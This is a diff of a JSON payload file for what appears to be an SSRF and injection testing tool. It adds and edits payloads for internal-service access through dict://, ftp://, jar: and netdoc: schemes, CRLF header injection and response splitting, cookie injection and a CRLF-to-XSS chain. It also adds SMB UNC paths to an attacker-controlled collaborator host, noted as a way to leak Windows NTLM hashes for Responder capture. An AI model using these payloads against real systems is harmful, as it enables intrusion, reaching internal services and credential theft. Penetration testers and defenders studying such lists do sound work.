@@ -53,17 +53,17 @@
     {
       "category": "scheme_dict",
       "payload": "dict://127.0.0.1:6379/INFO",
-      "note": "Dict protocol \u2192 Redis"
+      "note": "Dict protocol → Redis"
     },
     {
       "category": "scheme_dict",
       "payload": "dict://127.0.0.1:11211/stats",
-      "note": "Dict protocol \u2192 Memcached"
+      "note": "Dict protocol → Memcached"
     },
     {
       "category": "scheme_ftp",
       "payload": "ftp://127.0.0.1:21/",
-      "note": "FTP scheme \u2014 often unblocked"
+      "note": "FTP scheme — often unblocked"
     },
     {
       "category": "scheme_ldap",
@@ -78,17 +78,17 @@
     {
       "category": "scheme_sftp",
       "payload": "sftp://127.0.0.1:22/",
-      "note": "SFTP scheme \u2014 bypasses HTTP-only checks"
+      "note": "SFTP scheme — bypasses HTTP-only checks"
     },
     {
       "category": "scheme_jar",
       "payload": "jar:http://127.0.0.1:80/!/",
-      "note": "JAR URL \u2014 Java-specific bypass"
+      "note": "JAR URL — Java-specific bypass"
     },
     {
       "category": "scheme_netdoc",
       "payload": "netdoc:http://127.0.0.1/",
-      "note": "Netdoc scheme \u2014 Java-specific bypass"
+      "note": "Netdoc scheme — Java-specific bypass"
     },
     {
       "category": "oob_generic",
@@ -104,6 +104,16 @@
       "category": "oob_dns",
       "payload": "http://{token}.{collab_host}",
       "note": "OOB DNS-only canary (no path)"
+    },
+    {
+      "category": "scheme_smb",
+      "payload": "\\\\{token}.{collab_host}\\share",
+      "note": "SMB UNC path — Windows NTLM hash leak via SSRF (Responder capture)"
+    },
+    {
+      "category": "scheme_smb",
+      "payload": "file:////{token}.{collab_host}/share",
+      "note": "SMB via file:// UNC — alternative Windows SSRF path for NTLM leak"
     }
   ],
   "redirect": [
@@ -191,7 +201,7 @@
     },
     {
       "category": "phar",
-      "payload": "phar:///tmp/gateforge.phar/",
+      "payload": "phar:///tmp/ravager.phar/",
       "note": "Phar deserialization wrapper"
     }
   ],
@@ -242,33 +252,33 @@
   "crlf_injection": [
     {
       "category": "crlf_basic",
-      "payload": "%0d%0aX-Injected:%20gateforge-v2",
+      "payload": "%0d%0aX-Injected:%20ravager-v2",
       "note": "CRLF URL-encoded, header injection"
     },
     {
       "category": "crlf_basic",
-      "payload": "%0aX-Injected:%20gateforge-v2",
-      "note": "LF only \u2014 some servers split on LF alone"
+      "payload": "%0aX-Injected:%20ravager-v2",
+      "note": "LF only — some servers split on LF alone"
     },
     {
       "category": "crlf_basic",
-      "payload": "\r\nX-Injected: gateforge-v2",
-      "note": "Raw CRLF \u2014 test unencoded path"
+      "payload": "\r\nX-Injected: ravager-v2",
+      "note": "Raw CRLF — test unencoded path"
     },
     {
       "category": "crlf_double",
-      "payload": "%0d%0a%0d%0aX-Injected:%20gateforge-v2",
-      "note": "Double CRLF \u2014 HTTP response splitting"
+      "payload": "%0d%0a%0d%0aX-Injected:%20ravager-v2",
+      "note": "Double CRLF — HTTP response splitting"
     },
     {
       "category": "crlf_utf8",
-      "payload": "%E5%98%8A%E5%98%8DX-Injected:%20gateforge-v2",
+      "payload": "%E5%98%8A%E5%98%8DX-Injected:%20ravager-v2",
       "note": "UTF-8 CRLF sequence (Jetty bypass)"
     },
     {
       "category": "crlf_unicode",
-      "payload": "%u000d%u000aX-Injected:%20gateforge-v2",
-      "note": "Unicode CRLF \u2014 IIS bypass"
+      "payload": "%u000d%u000aX-Injected:%20ravager-v2",
+      "note": "Unicode CRLF — IIS bypass"
     },
     {
       "category": "crlf_location",
@@ -277,13 +287,13 @@
     },
     {
       "category": "crlf_setcookie",
-      "payload": "%0d%0aSet-Cookie:%20session=gateforge-v2;Path=/",
+      "payload": "%0d%0aSet-Cookie:%20session=ravager-v2;Path=/",
       "note": "CRLF + cookie injection"
     },
     {
       "category": "crlf_html",
       "payload": "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
-      "note": "CRLF + content-type \u2192 reflected XSS via SSRF chain"
+      "note": "CRLF + content-type → reflected XSS via SSRF chain"
     }
   ],
   "host_header": [
@@ -295,7 +305,7 @@
     {
       "category": "host_loopback",
       "payload": "127.0.0.1",
-      "note": "Loopback \u2014 test routing bypass"
+      "note": "Loopback — test routing bypass"
     },
     {
       "category": "host_loopback",
@@ -330,7 +340,7 @@
     {
       "category": "host_encoded",
       "payload": "0x7f000001",
-      "note": "Hex loopback \u2014 some parsers resolve"
+      "note": "Hex loopback — some parsers resolve"
     },
     {
       "category": "host_encoded",
